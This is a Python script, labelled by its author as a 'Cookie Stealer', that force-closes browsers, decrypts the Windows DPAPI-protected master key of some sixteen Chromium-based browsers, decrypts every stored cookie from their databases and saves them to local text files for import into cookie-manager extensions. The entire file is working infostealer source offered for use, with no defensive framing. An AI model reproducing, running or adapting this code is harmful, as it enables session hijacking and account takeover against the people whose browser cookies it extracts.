# Cookie Retriever / Cookie Stealer made by github.com/lawxsz leave credits <3
# Formatted to import into Cookie Quick Manager and other extensions!

import os
import sqlite3
import json
import shutil
import base64
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES


appdata = os.getenv('LOCALAPPDATA')

def kill_browsers():
    browsers = [
        "chrome.exe",   # Google Chrome
        "msedge.exe",   # Microsoft Edge
        "firefox.exe",  # Mozilla Firefox
        "opera.exe",    # Opera
        "iexplore.exe", # Internet Explorer
        "brave.exe",    # Brave Browser
        "vivaldi.exe"   # Vivaldi
    ]

    for browser in browsers:
        command = f"taskkill /F /IM {browser}"
        result = os.system(command)
        
        if result == 0:
            print(f"{browser} closed sucessfuly!")
        else:
            print(f"Fail {browser}. exception: {result}")


def get_master_key(browser_path):
    local_state_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state_path):
        print(f"Local State file not found in: {local_state_path}")
        return None

    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        master_key_encrypted = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = CryptUnprotectData(master_key_encrypted[5:], None, None, None, 0)[1]
        return master_key
    except Exception as e:
        print(f"Failed to extract or decrypt master key: {e}")
        return None
def decrypt_value(encrypted_value, key):
    try:
        if encrypted_value[:3] == b'v10' or encrypted_value[:3] == b'v11':
            encrypted_value = encrypted_value[3:]
        initial_vector = encrypted_value[:12]
        encrypted_value = encrypted_value[12:]
        cipher = AES.new(key, AES.MODE_GCM, initial_vector)
        decrypted_value = cipher.decrypt(encrypted_value[:-16])
        return decrypted_value.decode('utf-8')
    except Exception as e:
        print(f"Failed to decrypt value: {e}")
        return ""

def extract_and_format_cookies(browser_path, master_key):
    cookies_db_path = os.path.join(browser_path, 'Default', 'Network', 'Cookies')
    if not os.path.exists(cookies_db_path):
        print(f"No cookie database found at {cookies_db_path}")
        return []

    temp_db_path = os.path.join(browser_path, 'temp_cookies.sqlite')
    shutil.copy2(cookies_db_path, temp_db_path)
    conn = sqlite3.connect(temp_db_path)
    cursor = conn.cursor()
    formatted_cookies = []

    cursor.execute('SELECT host_key, name, path, is_secure, expires_utc, encrypted_value FROM cookies')
    for row in cursor.fetchall():
        host_key, name, path, is_secure, expires_utc, encrypted_value = row
        cookie_value = decrypt_value(encrypted_value, master_key)
        secure_flag = 'TRUE' if is_secure else 'FALSE'
        expires_utc = int(expires_utc / 1000000 - 11644473600) if expires_utc else 0
        formatted_cookie = f"{host_key}\tFALSE\t{path}\t{secure_flag}\t{expires_utc}\t{name}\t{cookie_value}\n"
        formatted_cookies.append(formatted_cookie)

    cursor.close()
    conn.close()
    os.remove(temp_db_path)
    return formatted_cookies

def save_cookies(formatted_cookies, output_dir, browser_name):
    output_file = os.path.join(output_dir, f'{browser_name}_cookies.txt')
    with open(output_file, 'w', encoding='utf-8') as f:
        for cookie in formatted_cookies:
            f.write(cookie)

def main():
    kill_browsers()
    output_dir = os.path.join(os.getcwd(), 'SavedCookies')
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    appdata = os.getenv('LOCALAPPDATA')
    browsers = {
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}
    for browser_name, browser_path in browsers.items():
        print(f"Processing {browser_name}...")
        master_key = get_master_key(browser_path)
        if master_key:
            print(f"Master key obtained for {browser_name}.")
            cookies = extract_and_format_cookies(browser_path, master_key)
            save_cookies(cookies, output_dir, browser_name)
        else:
            print(f"Failed to obtain master key for {browser_name}.")

if __name__ == "__main__":
    main()
